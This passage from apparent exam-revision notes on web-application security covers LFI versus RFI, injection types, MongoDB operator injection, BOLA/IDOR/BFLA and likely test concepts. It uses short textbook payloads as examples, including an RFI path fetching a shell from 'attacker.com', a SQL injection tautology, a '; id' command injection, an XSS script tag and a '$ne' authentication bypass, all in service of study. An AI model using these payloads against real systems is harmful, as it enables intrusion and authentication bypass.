| Modern Default | ✅ Exploitable by default | ❌ Disabled by default (PHP ≥ 5.2) |
| Severity | High | Critical |
| Path | `../../../../etc/passwd` | `http://attacker.com/shell` |
| RCE path | Via log poisoning / session file | Direct (file fetched and executed) |

---

### 📊 Injection Types — Interpreter Reference

| Injection Type | Interpreter | OWASP 2025 | Example |
|---|---|---|---|
| SQL Injection | Database (MySQL, MSSQL, Oracle) | A05:2025 | `' OR '1'='1` |
| NoSQL Injection | NoSQL DB (MongoDB) | A05:2025 | `{"$ne":""}` |
| Command Injection | OS Shell (bash, cmd.exe) | A05:2025 | `; id` |
| XSS | Browser (JavaScript engine) | A05:2025 | `<script>alert(1)</script>` |
| SSTI | Template Engine (Jinja2, Twig) | A05:2025 | `{{7*7}}` |
| LDAP Injection | LDAP Directory Service | A05:2025 | `*)(uid=*))(|(uid=*` |
| XML/XPath Injection | XML Parser / XPath engine | A05:2025 | `' or 1=1 or '` |
| CRLF Injection | HTTP parser | A05:2025 | `%0d%0aHeader: injected` |

---

### 📊 MongoDB Operator Injection — Quick Reference

| Operator | Meaning | Injection Example | Effect |
|---|---|---|---|
| `$ne` | Not equal | `{"password": {"$ne": ""}}` | Always true — auth bypass |
| `$gt` | Greater than | `{"age": {"$gt": 0}}` | Match all |
| `$regex` | Regex match | `{"user": {"$regex": "a.*"}}` | Enumerate starting with 'a' |
| `$where` | JS expression | `{"$where": "sleep(5000)"}` | Time-based blind |
| `$exists` | Field exists | `{"admin": {"$exists": true}}` | Find admin records |

---

### 📊 BOLA vs IDOR vs BFLA — Key Distinctions

| Property | BOLA | IDOR | BFLA |
|---|---|---|---|
| List | OWASP API Security (API1:2023) | OWASP Web App (old A4:2013) | OWASP API Security (API5:2023) |
| Level | Object/data level | Object reference level | Function/endpoint level |
| Access type | Horizontal (others' data) | Horizontal | Vertical (privileged functions) |
| Current placement | API1:2023 | A01:2025 Broken Access Control | API5:2023 |

---

## 10. Session Revision Snapshot

### 🎯 TL;DR — 5-Bullet Summary

1. **SQL Injection has 6 types** — In-Band (Classic/Union/Error), Blind (Boolean/Time-Based), and OOB — each exploits the same root cause (no parameterization) but differs in how data is retrieved; parameterized queries defeat all six.
2. **LFI reads local files; RFI executes remote code** — RFI requires `allow_url_include = On` (off by default in PHP ≥ 5.2); LFI escalates to RCE via log poisoning; both are path traversal variants.
3. **XSS has three types** — Reflected (single victim, in request), Stored (all viewers, in DB), DOM-Based (client-side only, never hits server) — all classified under A05:2025 Injection since the XSS→Injection merge in 2021.
4. **OWASP API Security 2023 has 3 new categories** — Unrestricted Access to Business Flows (API6), SSRF (API7), and Unsafe Consumption of APIs (API10) — and removed Injection + Logging from 2019.
5. **BOLA ≠ IDOR ≠ BFLA** — BOLA is API1:2023 (object-level, horizontal, API context), IDOR is the web app equivalent now under A01:2025, BFLA is API5:2023 (function-level, vertical).

---

### 📌 MCQ-Likely Concepts — Full List

| Concept | Why It's MCQ-Relevant |
|---|---|
| 6 SQLi types and their data channel | Core classification — which type uses HTTP response vs timing vs DNS |
| Union-based requires same column count | Technical requirement — trap question |
| Oracle needs `FROM DUAL` in UNION | Database-specific trap — easy MCQ |
| Error-based requires error messages visible | Precondition — if custom errors = becomes blind |
| SLEEP() vs WAITFOR DELAY vs pg_sleep() | Database-specific time-delay syntax |
| Second-order SQLi | Stored, fires when retrieved — bypasses input sanitization |
| xp_cmdshell disabled by default in MSSQL | Escalation path — requires sysadmin privilege to enable |
| `allow_url_include = Off` by default (PHP ≥ 5.2) | RFI precondition — commonly tested |
| LFI → RCE via log poisoning | Escalation technique — inject PHP into logs then include via LFI |
| `open_basedir` — PHP LFI defense | PHP configuration defense |
| XSS merged into Injection in 2021 (was A7:2017) | Version history trap |
| DOM XSS never hits server — WAF blind | Key DOM XSS characteristic |
| innerHTML vs textContent (DOM XSS sink vs safe) | Source-sink model |
| HttpOnly prevents document.cookie access | Cookie theft mitigation |
| CSP is the primary XSS defense (not X-XSS-Protection) | Modern vs deprecated |
| BOLA = API1:2023 (since 2019 — unchanged) | Stable #1 since API Security list began |
| API1:2023 = ~40% of all API attacks | Prevalence statistic |
| BOPLA = merge of API3:2019 + API6:2019 | Merger trap — what two categories merged |
| API4 renamed "Unrestricted Resource Consumption" (was "Lack of Resources & Rate Limiting") | Rename trap |
| API8:2019 Injection REMOVED in 2023 | Removal — not just moved |
| API10:2019 Insufficient Logging REMOVED in 2023 | Removal — replaced by Unsafe Consumption |
| 3 new in 2023: API6, API7, API10 | New categories — tested directly |
| API7:2023 SSRF — standalone in API Security | SSRF appears in BOTH lists — different positions |
| SSRF = A10:2021 (Web App) = A01:2025 absorbed = API7:2023 (API Security) | Cross-list SSRF placement |
| BOLA vs IDOR — same attack, different list/context | Conceptual distinction |
| BOLA vs BFLA — object level vs function level | Horizontal vs vertical access |
| MongoDB `$ne` operator injection | NoSQL injection payload |
| `$where` enables JS injection in MongoDB | Most dangerous MongoDB operator |
| GraphQL introspection exposes full schema | Recon attack — disable in production |
| Heartland = SQLi + 130M cards + Albert Gonzalez 20yr | Case study detail |
| Shellshock = CVE-2014-6271 — Bash environment var RCE | Command injection CVE |
| Dell API breach = BOLA (49M records) | API Security case study |
| Kia API = BFLA (vehicle control without auth) | BFLA case study |
| DVWA: Low/Medium/High/Impossible levels | Lab environment detail |
| WebGoat = OWASP, Java, lesson-based | Lab context distinction |
| Parameterized queries = only complete SQLi defense | Defense primacy — all other measures are depth only |

---
